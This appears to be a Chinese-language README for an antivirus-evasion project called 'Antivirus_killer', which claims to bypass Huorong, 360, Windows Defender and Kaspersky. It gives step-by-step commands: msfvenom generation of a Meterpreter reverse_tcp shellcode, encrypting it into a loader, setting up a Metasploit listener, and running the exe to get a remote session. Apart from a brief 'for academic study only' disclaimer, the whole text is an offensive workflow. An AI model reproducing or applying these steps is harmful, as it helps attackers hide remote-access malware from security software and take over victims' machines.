# Antivirus_killer
免杀主流防病毒软件<br />
测试于2024年10月17日加载器2024_9_24(需配合新版加密器)可过最新版火绒、360核晶模式、windows自带杀软、卡巴斯基<br />
该项目仅供学术交流参考，请大家合法学习和使用项目
# 使用方法
## 生成shellcode
msfvenom LHOST=x.x.x.x LPORT=443 -p windows/x64/meterpreter/reverse_tcp -f c
## 加密shellcode 
将生成的shellcode复制到加密器.c的buf变量中并编译运行
## 编译加载器
将加密后的shellcode 复制到加载器的shellcode变量中编译
## 准备msf监听器
msfconsole<br />
use exploit/multi/handler<br />
set payload windows/x64/meterpreter/reverse_tcp<br />
set LHOST x.x.x.x<br />
set LPORT 443<br />
run<br />
## 双击编译好的exe观察是否上线

